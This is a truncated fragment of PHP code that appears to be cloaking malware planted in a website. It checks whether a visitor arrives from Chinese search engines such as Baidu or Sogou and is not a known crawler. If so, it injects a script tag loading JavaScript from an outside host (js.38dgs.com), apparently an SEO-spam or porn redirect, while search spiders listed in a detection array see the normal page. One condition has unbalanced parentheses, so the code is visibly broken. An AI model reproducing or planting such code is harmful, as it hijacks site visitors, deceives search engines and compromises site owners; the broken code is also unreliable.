...
$sm = 'p0rn';
$Class_ck = true;
$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/seo_id.js" ></script>';
define('Referer', $_SERVER['HTTP_REFERER']);
if (stristr(Referer,'baidu') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'yisou') or stristr(Referer,'sm.')) {
   if (stristr(Referer,'site') or stristr(Referer,'inurl')) {
        setcookie($sm, Host, time() + 259200);
        $Class_ck = false;
    }
    if (empty(!isCrawler() && stristr($_SERVER['REQUEST_URI'],'id=article')) {
            echo "$jumpjs";exit;
    }
}
function isCrawler() {
        ...
        if (!empty($agent)) {
                $spiderSite= array('Baiduspider+','Sosospider+','Sogou web spider','360Spider','Baiduspider','YisouSpider','UCBrowser','Baiduspider','HaosouSpider');
